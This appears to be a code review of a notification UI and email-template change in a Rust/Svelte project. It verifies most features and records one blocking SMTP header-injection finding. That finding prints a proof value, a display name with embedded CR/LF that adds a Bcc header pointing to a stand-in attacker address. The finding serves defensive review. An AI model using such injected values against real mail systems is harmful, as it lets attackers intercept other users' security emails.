# Review — task-113 (Implement in-app notification UI & email templates)

Spec: `specs/system/user-management.md` §In-App Notification UI, §Email Notifications.
Candidate under review: `400ad037e5da55de4ddc2f6278b020b6c52b1cc5` (base `9afd66c`).
Verdict: **needs-revision** — one blocking finding (F1: SMTP header injection); everything else verified clean.

## Round 1 (2026-11-14)

Probes run (checkout on the assigned branch at `400ad037`; evidence in
`/tmp/stage/review-evidence/`):

- `cargo check -p gyre-server` → exit 0 (includes the build.rs web asset build).
- `cargo test -p gyre-domain` → exit 0 (535 + 8 passed).
- `cd web && npm ci` → exit 0; `npx vitest run` on the four new test files →
  20/20 passed; full `npm test` → 119 files, 2371 passed / 41 skipped, exit 0.
- `cargo test -p gyre-server …` — blocked by the executor build wrapper (4 GiB
  budget; "Server builds/tests belong to the independent verifier"). The
  gyre-server test list the verifier must run is recorded in
  `review-evidence/review-notes.md` (email::, notifications:: WS-push targeting,
  notification_dispatcher per-type unsubscribe, plus `cargo test --all`).
- Standalone `rustc` probe replicating the exact `email.rs` subject/encode/build
  statements → header injection confirmed (F1 below).

### Verified working (no findings)

- **Bell + drawer (§In-App Notification UI).** `NotificationBell.svelte` sits in
  the App.svelte topbar beside the HSI §1.1 Decisions badge (correctly a distinct
  surface: Decisions = unresolved judgment items; bell = unread state across all
  notifications), badge capped at 99+, `aria-live` count. `NotificationDrawer.svelte`
  is a slide-out panel grouped Urgent→Low by `priority_level`, with per-item
  title/type/body-snippet/relative-time, per-item mark read/unread
  (`PUT …/read` + `POST …/unread`), bulk `POST …/mark-all-read` (workspace-scoped
  when that filter is active), a type/priority/workspace/repo filter bar driving
  the task-125 `?type=&priority=&workspace_id=&repo_id=` list filters, live
  indicator, and a preferences link. Deep links push the server-emitted
  `action_url` and replay the app's popstate router. Stale-response guard on
  filter races; repo options load per selected workspace.
- **Realtime.** `lib/notifications.svelte.js` subscribes the bell to the app's
  single authenticated `/ws` connection (wired in App.svelte, shared with
  presence/liveness — no second always-open HTTP stream, so the earlier e2e
  networkidle breakage from the fetch-streamed SSE per-tab connection is
  genuinely gone). The centralized `AppState::create_notification` fan-out
  (`BroadcastingNotificationRepo`) pushes `WsMessage::NotificationPush` to every
  live WS connection whose **server-verified** identity is the notification's
  owner; a connection without a verified identity never receives another user's
  notifications (test `create_notification_pushes_to_owners_live_ws_connections_only`).
  The impersonation-specific push was correctly folded into this single fan-out
  (its dead duplicate removed from impersonation.rs). The specced SSE endpoint
  `GET /api/v1/notifications/stream` is unchanged and per-event user+tenant filtered.
- **Preferences page.** `/settings/notifications` (`NotificationSettings.svelte`,
  `notification_settings` mode threaded through parseUrl/urlFor/pushState/popstate
  + user-menu entry) edits the caller's channel config via
  `GET/PUT /api/v1/notifications/preferences`: email on/off, digest frequency,
  min priority, per-type unsubscribe toggles, webhook (url/secret/min priority),
  Slack (webhook/channel/min priority). `in_app` forced true server-side
  (validated), `type_overrides` keys validated against the real notification-type
  taxonomy, and only `true` overrides are persisted.
- **Email templates (§Email Notifications).** `email.rs` renders HTML + text
  fallback for **every** `NotificationType` via an exhaustive `type_heading`
  match (a new variant without copy is a compile error), localized through a
  catalog driven by `User::locale` (BCP-47 tag, `en` default, `de` supported —
  no hardcoded prose outside the catalog). Digest mode aggregates all pending
  outbox entries into ONE email grouped Urgent→Low with per-item unsubscribe
  links; the `email_digest` job (registered in the job registry, spawned in
  main.rs, 60 s) drains the durable `email_outbox` at each user's configured
  frequency — Immediate sends individually, Hourly/Daily send once per elapsed
  window (kv `email_digest_state`). Priority filter enforced twice: at queue
  time (dispatcher) and re-checked at drain against the user's *current*
  config, so tightened settings drop already-queued noise. Unsubscribe link
  per type (`{base_url}/settings/notifications?unsubscribe={type}`) lands on
  the authenticated preferences page which persists the per-type opt-out the
  dispatcher honors at queue time. Unconfigured relay = queue-and-hold (nothing
  sent or dropped); failed sends retry next cycle. SMTP client is a real
  minimal RFC 5321 implementation (EHLO/MAIL FROM/RCPT TO/DATA, dot-stuffing,
  base64-wrapped multipart/alternative, RFC 2047 subjects, 10 s per-op
  timeouts, byte-safe reply-code parsing that cannot panic on non-char-boundary
  replies). Env vars documented in `docs/server-config.md`.
- **Pre-existing bug fixed en route:** `api.markNotificationRead` previously hit
  the *dismiss* endpoint; remapped to the read endpoint, and the three dismiss
  call-sites (Inbox/WorkspaceHome/CrossWorkspaceHome) moved to the real dismiss
  endpoint.
- **Tests are real guards, not inflation.** The frontend tests assert exact
  endpoint URLs and payload shapes (in_app forced true, only-true type_overrides
  persisted, `?unsubscribe=GateFailure` landing persists the opt-out), grouping
  order, popstate replay after deep-link push, filter param pass-through, and
  the repo-options race — each fails if the corresponding behavior breaks. The
  backend tests (deferred to the verifier per the build wrapper) include an
  end-to-end digest drain against an in-process fake SMTP relay asserting ONE
  aggregate email, outbox cleared, state stamped, and queue-and-hold with no
  relay. Coverage rows 19/20 marked `implemented` with accurate notes; no
  routes added (no ABAC registry impact); task commits recorded in frontmatter.

### Findings

- [F1, blocking — security/code] **SMTP header injection: user-controlled CR/LF
  in notification titles becomes extra RFC 5322 headers in outgoing email.**
  `crates/gyre-server/src/email.rs`: `build_message` (line 557) writes
  `Subject: {encode_subject(&email.subject)}`, and `encode_subject` (lines
  531-533) returns any ASCII subject unchanged; `render_notification_email`
  (line 337) embeds `notif.title` raw — no CR/LF stripping exists anywhere in
  the chain. Titles embed user-controlled free text: `impersonation.rs:243`
  copies `admin.display_name` (settable via `PUT /users/me` with no character
  restriction) into `impersonator_name`, which lands verbatim in the
  ImpersonationRequest title (`impersonation.rs:836-843`);
  `api/users.rs:1325` embeds `ws.name` (unvalidated at workspace creation).
  ImpersonationRequest is High band, which passes the default Medium email
  min_priority, so the approval-code email is sent whenever the target has the
  email channel on and `GYRE_SMTP_HOST` is configured. Reproduced with a
  standalone probe replicating the exact `email.rs` statements
  (`review-evidence/header-injection-probe.rs`): a display name of
  `"Ada\r\nBcc: admin@evil.example"` yields a standalone
  `Bcc: admin@evil.example` header line in the outgoing message — the relay
  copies the victim's impersonation approval-code email to the attacker,
  defeating the impersonation consent control (identity-security.md
  §Impersonation). **Repair:** strip/reject CR, LF (and NUL) in the subject
  inside `encode_subject`/`build_message`, validate the `to`/`from` addresses
  the same way, and add a test asserting a CRLF-laden notification title
  cannot produce a line break in the generated header block.

### Minor (non-blocking, recorded for completeness)

- Email locale catalog covers `en` + `de`; the web app itself registers only
  `en` (`web/src/lib/i18n.js`), so coverage matches the product's current
  locale surface. The mechanism is real (reads `User::locale`); new locales
  require catalog entries.
- Generated `web/dist/` is untouched by this diff — owned by the deterministic
  verifier (rebuilds remotely, runs checks, commits assets); recorded
  separately per review contract, not a finding.
- The unsubscribe link applies the opt-out on the authenticated preferences
  page (load + save) rather than a signed one-click token — matches the spec
  text and cannot be triggered cross-site without the user's SPA session.

### Verdict

needs-revision. F1 is a small, mechanical repair (header sanitization + one
test) in an otherwise faithful, well-tested implementation of both coverage
sections; the rest of the acceptance criteria are independently evidenced
(cargo check clean, gyre-domain 543 passed, full web suite 2371 passed, all
endpoint/UI/digest behaviors verified against source and tests).
